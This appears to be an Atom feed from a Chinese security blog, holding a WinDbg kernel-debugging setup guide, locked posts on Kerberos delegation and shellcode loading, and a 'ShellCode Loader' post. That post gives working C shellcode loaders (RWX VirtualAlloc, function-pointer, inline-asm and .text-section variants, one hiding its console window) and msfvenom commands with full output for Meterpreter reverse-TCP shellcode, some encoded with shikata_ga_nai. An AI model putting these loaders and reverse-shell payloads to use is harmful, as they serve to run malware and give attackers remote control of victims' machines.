clazz.newInstance();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>弹calc成功解析class文件。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[toc]&lt;/p&gt;
&lt;h1 id=&quot;前言-流程&quot;&gt;&lt;a href=&quot;#前言-流程&quot; class=&quot;headerlink&quot; title=&quot;前言+流程&quot;&gt;&lt;/a&gt;前言+流程&lt;/h1&gt;&lt;p&gt;java语言依赖JVM，运行的时候，需要先编译成class文件，之后java类初始化的时候</summary>
      
    
    
    
    
    <category term="Java" scheme="http://example.com/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>kerberos域委派攻击</title>
    <link href="http://example.com/2022/04/14/%E5%9F%9F%E5%A7%94%E6%B4%BE/"/>
    <id>http://example.com/2022/04/14/%E5%9F%9F%E5%A7%94%E6%B4%BE/</id>
    <published>2022-04-13T16:00:00.000Z</published>
    <updated>2022-04-21T15:09:53.817Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="哥,别试了" data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="5eac797a6422b7340cdd15b5885b3c4fd9b892ecfb57fe38c0835f21a1dca6c6">994f9c06d970fb4aead1c76eb2a7916e62bcafdec8d7aee3ae9798c457d1f96b14e7bbc38d24782f3c8761735ffadbe219ee849a6b74c28e3dcd56b839bb8162</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-wave">      <input class="hbe hbe-input-field hbe-input-field-wave" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-wave" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-wave">密码不记得，只有本地有</span>      </label>      <svg class="hbe hbe-graphic hbe-graphic-wave" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">        <path d="M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0"></path>      </svg>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">这里有东西被加密了，需要输入密码查看哦。</summary>
    
    
    
    
    <category term="内网" scheme="http://example.com/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>WinDbg使用及双机调试</title>
    <link href="http://example.com/2022/04/09/WinDbg%E4%BD%BF%E7%94%A8%E5%8F%8A%E5%8F%8C%E6%9C%BA%E8%B0%83%E8%AF%95/"/>
    <id>http://example.com/2022/04/09/WinDbg%E4%BD%BF%E7%94%A8%E5%8F%8A%E5%8F%8C%E6%9C%BA%E8%B0%83%E8%AF%95/</id>
    <published>2022-04-08T16:00:00.000Z</published>
    <updated>2022-04-09T08:11:22.306Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><h1 id="双机调试"><a href="#双机调试" class="headerlink" title="双机调试"></a>双机调试</h1><p>虚拟机添加串行端口：（如果发现建立的串行端口一直是串行端口2，则把虚拟机硬件中的打印机删除即可创建串行端口1）</p><p><img src="/2022/04/09/WinDbg%E4%BD%BF%E7%94%A8%E5%8F%8A%E5%8F%8C%E6%9C%BA%E8%B0%83%E8%AF%95/image-20220409155748490.png" alt="image-20220409155748490"></p><p>虚拟机中管理员打开powershell，bcdedit /enum查看启动的配置：</p><p><img src="/2022/04/09/WinDbg%E4%BD%BF%E7%94%A8%E5%8F%8A%E5%8F%8C%E6%9C%BA%E8%B0%83%E8%AF%95/image-20220409142848941.png" alt="image-20220409142848941"></p><p>执行以下命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">bcdedit  /set  “&#123;current&#125;”  bootmenupolicy  Legacy             //修改启动方式为Legacy</span><br><span class="line"></span><br><span class="line">bcdedit  /dbgsettings  SERIAL  DEBUGPORT:1  BAUDRATE:115200     //设置串口1为调试端口，波特率为115200</span><br><span class="line"></span><br><span class="line">bcdedit  /copy  “&#123;current&#125;”   /d  “Debug”      //将当前配置复制到 Debug 启动配置(新建了Debug启动配置)</span><br></pre></td></tr></table></figure><p><img src="/2022/04/09/WinDbg%E4%BD%BF%E7%94%A8%E5%8F%8A%E5%8F%8C%E6%9C%BA%E8%B0%83%E8%AF%95/image-20220409143101892.png" alt="image-20220409143101892"></p><p>新建的启动配置：</p><p><img src="/2022/04/09/WinDbg%E4%BD%BF%E7%94%A8%E5%8F%8A%E5%8F%8C%E6%9C%BA%E8%B0%83%E8%AF%95/image-20220409143218989.png" alt="image-20220409143218989"></p><p>继续执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bcdedit /debug &quot;&#123;38a233ff-a78b-11ec-a34b-fcc86d824bb2&#125;&quot; on      //打开调试开关</span><br><span class="line">//&#123;&#125;里面的是新建的启动配置的标识符</span><br></pre></td></tr></table></figure><p>查看配置：</p><p><img src="/2022/04/09/WinDbg%E4%BD%BF%E7%94%A8%E5%8F%8A%E5%8F%8C%E6%9C%BA%E8%B0%83%E8%AF%95/image-20220409143417309.png" alt="image-20220409143417309"></p><p>虚拟机重启后显示如下则成功：</p><p><img src="/2022/04/09/WinDbg%E4%BD%BF%E7%94%A8%E5%8F%8A%E5%8F%8C%E6%9C%BA%E8%B0%83%E8%AF%95/image-20220409143702060.png" alt="image-20220409143702060"></p><p>可以选择这样连接：</p><p><img src="/2022/04/09/WinDbg%E4%BD%BF%E7%94%A8%E5%8F%8A%E5%8F%8C%E6%9C%BA%E8%B0%83%E8%AF%95/image-20220409144421844.png" alt="image-20220409144421844"></p><p>也可以<code>-b -k com:pipe,port=\\.\pipe\com_1,resets=0,reconnect -y</code>，高级里面管理员运行：</p><p><img src="/2022/04/09/WinDbg%E4%BD%BF%E7%94%A8%E5%8F%8A%E5%8F%8C%E6%9C%BA%E8%B0%83%E8%AF%95/image-20220409145103220.png" alt="image-20220409145103220"></p><p>成功：<img src="/2022/04/09/WinDbg%E4%BD%BF%E7%94%A8%E5%8F%8A%E5%8F%8C%E6%9C%BA%E8%B0%83%E8%AF%95/image-20220409145200846.png" alt="image-20220409145200846"></p><p>下面是配置symbol：</p><p>可以配置环境变量：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">_NT_SYMBOL_PATH</span><br><span class="line">srv*E:\symbols*https://msdl.microsoft.com/download/symbols</span><br></pre></td></tr></table></figure><p>也可以直接在Symbol Search Path中加：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">srv*E:\symbols*https://msdl.microsoft.com/download/symbols</span><br></pre></td></tr></table></figure><h1 id="WinDbg命令"><a href="#WinDbg命令" class="headerlink" title="WinDbg命令"></a>WinDbg命令</h1><h2 id="ring3"><a href="#ring3" class="headerlink" title="ring3"></a>ring3</h2><ul><li><p>  version：显示调试器版本信息和已加载的调试器扩展</p></li><li><p>  vercommand： 显示调试器启动文件的路径</p></li><li><p>.formats：显示数字的各种格式信息</p><p>  <img src="/2022/04/09/WinDbg%E4%BD%BF%E7%94%A8%E5%8F%8A%E5%8F%8C%E6%9C%BA%E8%B0%83%E8%AF%95/image-20220409154225866.png" alt="image-20220409154225866"></p></li><li><p>  .cls：清屏</p></li><li><p>ld：加载指定或者所有模块的符号</p><p>  <img src="/2022/04/09/WinDbg%E4%BD%BF%E7%94%A8%E5%8F%8A%E5%8F%8C%E6%9C%BA%E8%B0%83%E8%AF%95/image-20220409154421965.png" alt="image-20220409154421965"></p></li><li><p>  lm：显示所有加载和未加载的模块信息</p></li></ul><h2 id="ring0"><a href="#ring0" class="headerlink" title="ring0"></a>ring0</h2><p>额命令啥的先不写了，太多了，之后补充</p><blockquote><p>  <a href="https://www.cnblogs.com/gaochundong/p/windbg_cheat_sheet.html">https://www.cnblogs.com/gaochundong/p/windbg_cheat_sheet.html</a></p><p>  <a href="https://www.cnblogs.com/kekec/archive/2012/12/02/2798020.html">https://www.cnblogs.com/kekec/archive/2012/12/02/2798020.html</a></p><p>  <a href="https://www.kanxue.com/book-8-62.htm#">https://www.kanxue.com/book-8-62.htm#</a></p><p>  <a href="https://www.cnblogs.com/DarkBright/p/10843698.html">https://www.cnblogs.com/DarkBright/p/10843698.html</a></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[toc]&lt;/p&gt;
&lt;h1 id=&quot;双机调试&quot;&gt;&lt;a href=&quot;#双机调试&quot; class=&quot;headerlink&quot; title=&quot;双机调试&quot;&gt;&lt;/a&gt;双机调试&lt;/h1&gt;&lt;p&gt;虚拟机添加串行端口：（如果发现建立的串行端口一直是串行端口2，则把虚拟机硬件中的打印机删除即可创建</summary>
      
    
    
    
    
    <category term="内核" scheme="http://example.com/tags/%E5%86%85%E6%A0%B8/"/>
    
  </entry>
  
  <entry>
    <title>回调函数加载shellcode</title>
    <link href="http://example.com/2022/04/09/%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0%E5%8A%A0%E8%BD%BDshellcode/"/>
    <id>http://example.com/2022/04/09/%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0%E5%8A%A0%E8%BD%BDshellcode/</id>
    <published>2022-04-08T16:00:00.000Z</published>
    <updated>2022-04-09T07:49:28.239Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="哥,别试了" data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="9c14c29a873c19aee424e783624f7be73ef4ab392f1d84ca271ae9627fb1241a">994f9c06d970fb4aead1c76eb2a7916e14b9466af8aee544a618a637115cb50a</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-wave">      <input class="hbe hbe-input-field hbe-input-field-wave" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-wave" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-wave">密码不记得，只有本地有</span>      </label>      <svg class="hbe hbe-graphic hbe-graphic-wave" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">        <path d="M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0"></path>      </svg>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">这里有东西被加密了，需要输入密码查看哦。</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>ShellCode Loader(持续更新)</title>
    <link href="http://example.com/2022/04/08/ShellCodeLoader/"/>
    <id>http://example.com/2022/04/08/ShellCodeLoader/</id>
    <published>2022-04-07T16:00:00.000Z</published>
    <updated>2022-04-08T15:44:03.568Z</updated>
    
    <content type="html"><![CDATA[<p>记录一些语言的shellcode 加载方式，持续更新…</p><p>[toc]</p><h1 id="C-C"><a href="#C-C" class="headerlink" title="C/C++"></a>C/C++</h1><p>首先是c的loader，分两种，指针直接执行和动态分配。</p><h2 id="指针执行"><a href="#指针执行" class="headerlink" title="指针执行"></a>指针执行</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="comment">//设置入口地址，不弹出黑窗口</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">pragma</span> comment(linker,<span class="meta-string">&quot;/subsystem:\&quot;Windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> shellcode[] =</span><br><span class="line"><span class="string">&quot;shellcode&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//都可</span></span><br><span class="line"><span class="comment">//((void(*)()) &amp;shellcode)();</span></span><br><span class="line">    <span class="comment">//(*(void(*)()) &amp;shellcode)();</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//也可以这样</span></span><br><span class="line"> <span class="comment">//void (*func)();</span></span><br><span class="line">    <span class="comment">//func = (void (*)())(void *)shellcode;</span></span><br><span class="line">    <span class="comment">//func();</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="动态分配"><a href="#动态分配" class="headerlink" title="动态分配"></a>动态分配</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> shellcode[] =</span><br><span class="line"><span class="string">&quot;shellcode&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">PVOID Memory;</span><br><span class="line">    Memory = VirtualAlloc(<span class="literal">NULL</span>,<span class="keyword">sizeof</span>(shellcode),MEM_COMMIT|MEM_RESERVE,PAGE_EXECUTE_READWRITE);</span><br><span class="line">    <span class="comment">//动态分配虚地址空间</span></span><br><span class="line">    <span class="built_in">memcpy</span>(Memory,buf,<span class="keyword">sizeof</span>(shellcode));</span><br><span class="line">    <span class="comment">//复制内存内容</span></span><br><span class="line">    ((<span class="keyword">void</span>(*)())Memory)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="内联汇编"><a href="#内联汇编" class="headerlink" title="内联汇编"></a>内联汇编</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span>  </span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(linker, <span class="meta-string">&quot;/section:.data,RWE&quot;</span>)  </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> shellcode[] = <span class="string">&quot;shellcode&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm</span><br><span class="line">    &#123;</span><br><span class="line">        mov eax, offset shellcode</span><br><span class="line">        jmp eax</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="写到text段"><a href="#写到text段" class="headerlink" title="写到text段"></a>写到text段</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> section(<span class="meta-string">&quot;.text&quot;</span>)</span></span><br><span class="line"></span><br><span class="line">__declspec(allocate(<span class="string">&quot;.text&quot;</span>)) <span class="keyword">char</span> shellcode[] =</span><br><span class="line">    <span class="string">&quot;\xba\x9f\x20\x22\xd2\xda\xd4\xd9\x74\x24\xf4\x5f\x33\xc9\xb1&quot;</span></span><br><span class="line">    <span class="string">&quot;\x30\x83\xc7\x04\x31\x57\x0f\x03\x57\x90\xc2\xd7\x2e\x46\x80&quot;</span></span><br><span class="line">    <span class="string">&quot;\x18\xcf\x96\xe5\x91\x2a\xa7\x25\xc5\x3f\x97\x95\x8d\x12\x1b&quot;</span></span><br><span class="line">    <span class="string">&quot;\x5d\xc3\x86\xa8\x13\xcc\xa9\x19\x99\x2a\x87\x9a\xb2\x0f\x86&quot;</span></span><br><span class="line">    <span class="string">&quot;\x18\xc9\x43\x68\x21\x02\x96\x69\x66\x7f\x5b\x3b\x3f\x0b\xce&quot;</span></span><br><span class="line">    <span class="string">&quot;\xac\x34\x41\xd3\x47\x06\x47\x53\xbb\xde\x66\x72\x6a\x55\x31&quot;</span></span><br><span class="line">    <span class="string">&quot;\x54\x8c\xba\x49\xdd\x96\xdf\x74\x97\x2d\x2b\x02\x26\xe4\x62&quot;</span></span><br><span class="line">    <span class="string">&quot;\xeb\x85\xc9\x4b\x1e\xd7\x0e\x6b\xc1\xa2\x66\x88\x7c\xb5\xbc&quot;</span></span><br><span class="line">    <span class="string">&quot;\xf3\x5a\x30\x27\x53\x28\xe2\x83\x62\xfd\x75\x47\x68\x4a\xf1&quot;</span></span><br><span class="line">    <span class="string">&quot;\x0f\x6c\x4d\xd6\x3b\x88\xc6\xd9\xeb\x19\x9c\xfd\x2f\x42\x46&quot;</span></span><br><span class="line">    <span class="string">&quot;\x9f\x76\x2e\x29\xa0\x69\x91\x96\x04\xe1\x3f\xc2\x34\xa8\x55&quot;</span></span><br><span class="line">    <span class="string">&quot;\x15\xca\xd6\x1b\x15\xd4\xd8\x0b\x7e\xe5\x53\xc4\xf9\xfa\xb1&quot;</span></span><br><span class="line">    <span class="string">&quot;\xa1\xf6\xb0\x98\x83\x9e\x1c\x49\x96\xc2\x9e\xa7\xd4\xfa\x1c&quot;</span></span><br><span class="line">    <span class="string">&quot;\x42\xa4\xf8\x3d\x27\xa1\x45\xfa\xdb\xdb\xd6\x6f\xdc\x48\xd6&quot;</span></span><br><span class="line">    <span class="string">&quot;\xa5\xbf\x0f\x44\x25\x40&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    (*(<span class="keyword">void</span> (*)())(&amp;shellcode))();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h1><p>到kali机的，(自用</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ msfvenom -p windows/meterpreter/reverse_tcp LHOST=<span class="number">192.168</span><span class="number">.188</span><span class="number">.129</span> LPORT=<span class="number">4444</span> -a x86 --platform Windows -f c  </span><br><span class="line">No encoder specified, outputting raw payload</span><br><span class="line">Payload size: <span class="number">354</span> bytes</span><br><span class="line">Final size of c file: <span class="number">1512</span> bytes</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> buf[] = </span><br><span class="line"><span class="string">&quot;\xfc\xe8\x8f\x00\x00\x00\x60\x31\xd2\x64\x8b\x52\x30\x8b\x52&quot;</span></span><br><span class="line"><span class="string">&quot;\x0c\x8b\x52\x14\x89\xe5\x31\xff\x0f\xb7\x4a\x26\x8b\x72\x28&quot;</span></span><br><span class="line"><span class="string">&quot;\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\x49&quot;</span></span><br><span class="line"><span class="string">&quot;\x75\xef\x52\x8b\x52\x10\x57\x8b\x42\x3c\x01\xd0\x8b\x40\x78&quot;</span></span><br><span class="line"><span class="string">&quot;\x85\xc0\x74\x4c\x01\xd0\x50\x8b\x58\x20\x01\xd3\x8b\x48\x18&quot;</span></span><br><span class="line"><span class="string">&quot;\x85\xc9\x74\x3c\x49\x31\xff\x8b\x34\x8b\x01\xd6\x31\xc0\xac&quot;</span></span><br><span class="line"><span class="string">&quot;\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24&quot;</span></span><br><span class="line"><span class="string">&quot;\x75\xe0\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c&quot;</span></span><br><span class="line"><span class="string">&quot;\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59&quot;</span></span><br><span class="line"><span class="string">&quot;\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xe9\x80\xff\xff\xff\x5d&quot;</span></span><br><span class="line"><span class="string">&quot;\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c\x77\x26&quot;</span></span><br><span class="line"><span class="string">&quot;\x07\x89\xe8\xff\xd0\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68&quot;</span></span><br><span class="line"><span class="string">&quot;\x29\x80\x6b\x00\xff\xd5\x6a\x0a\x68\xc0\xa8\xbc\x81\x68\x02&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x11\x5c\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea&quot;</span></span><br><span class="line"><span class="string">&quot;\x0f\xdf\xe0\xff\xd5\x97\x6a\x10\x56\x57\x68\x99\xa5\x74\x61&quot;</span></span><br><span class="line"><span class="string">&quot;\xff\xd5\x85\xc0\x74\x0a\xff\x4e\x08\x75\xec\xe8\x67\x00\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x83&quot;</span></span><br><span class="line"><span class="string">&quot;\xf8\x00\x7e\x36\x8b\x36\x6a\x40\x68\x00\x10\x00\x00\x56\x6a&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57&quot;</span></span><br><span class="line"><span class="string">&quot;\x68\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x68\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x40\x00\x00\x6a\x00\x50\x68\x0b\x2f\x0f\x30\xff\xd5\x57\x68&quot;</span></span><br><span class="line"><span class="string">&quot;\x75\x6e\x4d\x61\xff\xd5\x5e\x5e\xff\x0c\x24\x0f\x85\x70\xff&quot;</span></span><br><span class="line"><span class="string">&quot;\xff\xff\xe9\x9b\xff\xff\xff\x01\xc3\x29\xc6\x75\xc1\xc3\xbb&quot;</span></span><br><span class="line"><span class="string">&quot;\xf0\xb5\xa2\x56\x6a\x00\x53\xff\xd5&quot;</span>;</span><br><span class="line"></span><br><span class="line">➜  ~ msfvenom -p windows/meterpreter/reverse_tcp LHOST=<span class="number">192.168</span><span class="number">.188</span><span class="number">.129</span> LPORT=<span class="number">4444</span> -a x86 --platform Windows -f c --bad <span class="string">&quot;\x00&quot;</span></span><br><span class="line">Found <span class="number">11</span> compatible encoders</span><br><span class="line">Attempting to encode payload with <span class="number">1</span> iterations of x86/shikata_ga_nai</span><br><span class="line">x86/shikata_ga_nai succeeded with size <span class="number">381</span> (iteration=<span class="number">0</span>)</span><br><span class="line">x86/shikata_ga_nai chosen with <span class="keyword">final</span> size <span class="number">381</span></span><br><span class="line">Payload size: <span class="number">381</span> bytes</span><br><span class="line">Final size of c file: <span class="number">1626</span> bytes</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> buf[] = </span><br><span class="line"><span class="string">&quot;\xbb\xfb\xb4\xcc\x3f\xda\xd9\xd9\x74\x24\xf4\x5a\x29\xc9\xb1&quot;</span></span><br><span class="line"><span class="string">&quot;\x59\x31\x5a\x14\x83\xc2\x04\x03\x5a\x10\x19\x41\x30\xd7\x52&quot;</span></span><br><span class="line"><span class="string">&quot;\xaa\xc9\x28\x0c\x9a\x1b\x4c\x47\x8e\xab\x04\xb2\xa4\x9e\x1a&quot;</span></span><br><span class="line"><span class="string">&quot;\xb7\xe9\x0a\xa8\xb5\x25\x3c\x19\x73\x10\x73\x9a\xb2\x9c\xdf&quot;</span></span><br><span class="line"><span class="string">&quot;\x58\xd5\x60\x22\x8d\x35\x58\xed\xc0\x34\x9d\xbb\xaf\xd9\x73&quot;</span></span><br><span class="line"><span class="string">&quot;\x6b\xdb\x77\x64\x18\x99\x4b\x85\xce\x95\xf3\xfd\x6b\x69\x87&quot;</span></span><br><span class="line"><span class="string">&quot;\xb1\x72\xba\xec\x02\x6d\xb1\xaa\xb2\xdd\xc4\x99\x36\x14\xb2&quot;</span></span><br><span class="line"><span class="string">&quot;\x21\x08\x58\x72\xd2\x5e\x2d\x84\x32\xaf\xf1\x2b\x7b\x1f\xfc&quot;</span></span><br><span class="line"><span class="string">&quot;\x32\xbc\x98\x1f\x41\xb6\xda\xa2\x52\x0d\xa0\x78\xd6\x91\x02&quot;</span></span><br><span class="line"><span class="string">&quot;\x0a\x40\x75\xb2\xdf\x17\xfe\xb8\x94\x5c\x58\xdd\x2b\xb0\xd3&quot;</span></span><br><span class="line"><span class="string">&quot;\xd9\xa0\x37\x33\x68\xf2\x13\x97\x30\xa0\x3a\x8e\x9c\x07\x42&quot;</span></span><br><span class="line"><span class="string">&quot;\xd0\x79\xf7\xe6\x9b\x68\xee\x97\x64\x73\x0f\xca\xf2\xbf\xc2&quot;</span></span><br><span class="line"><span class="string">&quot;\xf5\x02\xa8\x55\x85\x30\x77\xce\x01\x78\xf0\xc8\xd6\x09\x16&quot;</span></span><br><span class="line"><span class="string">&quot;\xeb\x09\xb1\x77\x15\xaa\xc1\x5e\xd2\xfe\x91\xc8\xf3\x7e\x7a&quot;</span></span><br><span class="line"><span class="string">&quot;\x09\xfb\xaa\x16\x03\x6b\x95\x4e\xaf\xea\x7d\x8c\xd0\xfd\x21&quot;</span></span><br><span class="line"><span class="string">&quot;\x19\x36\xad\x89\x49\xe7\x0e\x7a\x29\x57\xe7\x90\xa6\x88\x17&quot;</span></span><br><span class="line"><span class="string">&quot;\x9b\x6d\xa1\xb2\x74\xdb\x99\x2a\xec\x46\x51\xca\xf1\x5d\x1f&quot;</span></span><br><span class="line"><span class="string">&quot;\xcc\x7a\x57\xdf\x83\x8a\x12\xf3\xf4\xec\xdc\x0b\x05\x99\xdc&quot;</span></span><br><span class="line"><span class="string">&quot;\x61\x01\x0b\x8b\x1d\x0b\x6a\xfb\x81\xf4\x59\x78\xc5\x0b\x1c&quot;</span></span><br><span class="line"><span class="string">&quot;\x48\xbd\x3a\x8a\xf4\xa9\x42\x5a\xf4\x29\x15\x30\xf4\x41\xc1&quot;</span></span><br><span class="line"><span class="string">&quot;\x60\xa7\x74\x0e\xbd\xd4\x24\x9b\x3e\x8c\x99\x0c\x57\x32\xc7&quot;</span></span><br><span 